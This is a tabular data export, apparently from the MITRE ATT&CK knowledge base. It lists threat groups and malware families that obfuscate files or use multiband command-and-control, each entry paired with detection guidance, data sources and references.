475,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['[[Software/S0124|Pisloader]] obfuscates files by splitting strings into smaller sub-strings and including ""garbage"" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.[[CiteRef::Palo Alto DNS Requests]]']",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: Pisloader,['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
476,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['Some data in [[Software/S0125|Remsec]] is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Technical Analysis]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
477,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0131|TINYTYPHON]] has used XOR with 0x90 to obfuscate its configuration file.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: TINYTYPHON,['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
478,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['Many strings in [[Software/S0044|JHUHUGIT]] are obfuscated with a XOR algorithm.[[CiteRef::F-Secure Sofacy 2015]][[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: JHUHUGIT, Seduploader, ...",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
479,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['Most of the strings in [[Software/S0045|ADVSTORESHELL]] are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.[[CiteRef::Kaspersky Sofacy]][[CiteRef::Bitdefender APT28 Dec 2015]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
480,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['A version of [[Software/S0117|XTunnel]] introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: XTunnel, X-Tunnel, XAPS",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
481,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['Most strings in [[Software/S0136|USBStealer]] are encrypted using 3DES and XOR and reversed.[[CiteRef::ESET Sednit USBStealer 2014]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: USBStealer, USB Stealer, Win32/USBStealer",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
482,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0137|CORESHELL]] obfuscates strings using a custom stream cipher.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: CORESHELL, SOURFACE",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
483,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0138|OLDBAIT]] obfuscates internal strings and unpacks them at startup.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: OLDBAIT, Sasfis",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
484,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Group/G0007|APT28]] encrypted a .dll payload using RTL and a custom encryption algorithm.[[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
485,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['[[Software/S0148|RTM]] strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm.[[CiteRef::ESET RTM Feb 2017]]']",['RTM'],['RTM'],['G0048'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: RTM,['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
486,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['[[Software/S0081|Elise]] encrypts several of its files, including configuration files.[[CiteRef::Lotus Blossom Jun 2015]]']",['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: Elise, BKDR_ESILE, Page",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
487,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['Variants of [[Software/S0082|Emissary]] encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the ""srand"" and ""rand"" functions.[[CiteRef::Lotus Blossom Dec 2015]][[CiteRef::Emissary Trojan Feb 2016]]']",['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: Emissary,['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
488,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",[u'[[Group/G0050|APT32]] has used Daniel Bohannon\u2019s Invoke-Obfuscation framework to obfuscate their PowerShell.[[CiteRef::FireEye APT32 May 2017]][[CiteRef::GitHub Invoke-Obfuscation]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
489,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['[[Group/G0031|Dust Storm]] has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.[[CiteRef::Cylance Dust Storm]]']",['Dust Storm'],['Dust Storm'],['G0031'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
490,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['The payload of [[Software/S0046|CozyCar]] is encrypted with simple XOR with a rotating key. The [[Software/S0046|CozyCar]] configuration file has been encrypted with RC4 keys.[[CiteRef::F-Secure CozyDuke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: CozyCar, CozyDuke, ...",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
491,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0139|PowerDuke]] uses an alternate data stream (ADS) PNG file to hide and encrypt itself using Tiny Encryption Algorithm (TEA).[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: PowerDuke,['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
492,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0150|POSHSPY]] appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.[[CiteRef::FireEye POSHSPY April 2017]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: POSHSPY,['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
493,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['[[Group/G0032|Lazarus Group]] malware uses multiple types of encryption and encoding in its malware files, including AES, Caracachs, RC4, basic XOR with constant 0xA7, and other techniques.[[CiteRef::Novetta Blockbuster]][[CiteRef::Novetta Blockbuster Loaders]][[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
494,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0063|SHOTPUT]] is obscured using XOR encoding and appended to a valid GIF file.[[CiteRef::FireEye Clandestine Wolf]][[CiteRef::Palo Alto CVE-2015-3113 July 2015]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: SHOTPUT, Backdoor.APT.CookieCutter, Pirpi",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
495,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['A [[Software/S0153|RedLeaves]] configuration file is encrypted with a simple XOR key, 0x53.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: RedLeaves, BUGJUICE",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
496,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['The [[Software/S0062|DustySky]] dropper uses a function to obfuscate the name of functions and other parts of the malware.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: DustySky, NeD Worm",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
497,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","[""[[Software/S0070|HTTPBrowser]]'s code may be obfuscated through structured exception handling and return-oriented programming.[[CiteRef::Dell TG-3390]]""]",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
498,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]] Correlating alerts between multiple communication channels can further help identify command-and-control behavior.']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use multiple network protocols to avoid network-based detection.[[CiteRef::Dell TG-3390]]'],['DragonOK'],['DragonOK'],['G0017'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1026'],['Multiband Communication'],https://attack.mitre.org/wiki/Technique/T1026
499,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]] Correlating alerts between multiple communication channels can further help identify command-and-control behavior.']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0154|Cobalt Strike]]\'s ""beacon"" payload can receive C2 from one protocol and respond on another.  This is typically a mixture of HTTP, HTTPS, and DNS traffic.[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Command and Control'],['Technique/T1026'],['Multiband Communication'],https://attack.mitre.org/wiki/Technique/T1026
500,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]] Correlating alerts between multiple communication channels can further help identify command-and-control behavior.']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['Some [[Group/G0032|Lazarus Group]] malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.[[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1026'],['Multiband Communication'],https://attack.mitre.org/wiki/Technique/T1026
